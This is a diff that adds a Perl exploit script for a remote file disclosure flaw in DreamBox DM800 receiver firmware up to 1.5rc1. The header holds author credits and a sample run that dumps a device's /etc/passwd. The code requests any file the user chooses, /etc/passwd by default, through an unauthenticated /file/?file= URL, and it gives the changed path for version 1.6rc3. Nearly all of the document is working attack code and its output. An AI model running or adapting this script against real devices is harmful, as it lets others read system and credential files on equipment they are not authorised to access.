@@ -1,0 +1,63 @@
+#!/usr/bin/perl
+#  DreamBox DM800 <= 1.5rc1 Remote File Disclosure Exploit
+#
+#  Author: Todor Donev
+#  Email: todor.donev@@gmail.com
+#  Type: Hardware
+#  Vuln Type: Remote
+#####
+#  Product summary: DreamBox DM800 is Powerful receiver 
+#  for digital TV and Radio programs based on Linux.
+#  Product web page: http://www.dream-multimedia-tv.de
+#####
+# playground$ perl dreambox.pl target /etc/passwd
+# [+] DreamBox DM800 <= 1.5rc1 Remote File Disclosure Exploit
+#
+# root:<CENSORED>:0:0:root:/home/root:/bin/sh
+# daemon:*:1:1:daemon:/usr/sbin:/bin/sh
+# bin:*:2:2:bin:/bin:/bin/sh
+# sys:*:3:3:sys:/dev:/bin/sh
+# sync:*:4:65534:sync:/bin:/bin/sync
+# games:*:5:60:games:/usr/games:/bin/sh
+# man:*:6:12:man:/var/cache/man:/bin/sh
+# lp:*:7:7:lp:/var/spool/lpd:/bin/sh
+# mail:*:8:8:mail:/var/mail:/bin/sh
+# news:*:9:9:news:/var/spool/news:/bin/sh
+# uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
+# proxy:*:13:13:proxy:/bin:/bin/sh
+# www-data:*:33:33:www-data:/var/www:/bin/sh
+# backup:*:34:34:backup:/var/backups:/bin/sh
+# list:*:38:38:Mailing List Manager:/var/list:/bin/sh
+# irc:*:39:39:ircd:/var/run/ircd:/bin/sh
+# gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+# nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
+# avahi:x:500:64002:Avahi:/var/run/avahi-daemon:/bin/sh
+# ftp:x:501:64003:Linux User,,,:/var/tmp/ftp:/bin/false
+# gbox:<CENSORED>:0:0::/:/bin/sh
+#
+# playground$
+#####
+#  Thanks to all my friends and special to the best Tsvetelina Emirska, 
+#  that support and respect me !! =) 
+#####
+use LWP::Simple; 
+print "[+] DreamBox DM800 <= 1.5rc1 Remote File Disclosure\n";
+$host = $ARGV[0];
+$d = $ARGV[1];
+if(! $ARGV[0]) {
+print "[!] usg: perl dreambox.pl <host> </path/file>\n";
+exit;
+}
+if(! $ARGV[1]) {
+$d = "/etc/passwd";
+}
+## Edit here for exploitng DreamBox DM800 <= 1.6rc3 
+# my $result = get("http://$host/file?file=$d"); 
+## Greetings for ShellVision who found this bug in version 1.6rc3
+my $result = get("http://$host/file/?file=$d");
+if (defined $result) {
+print "\n$result";
+}
+else {
+print "[-] Not vuln.. =(";
+}
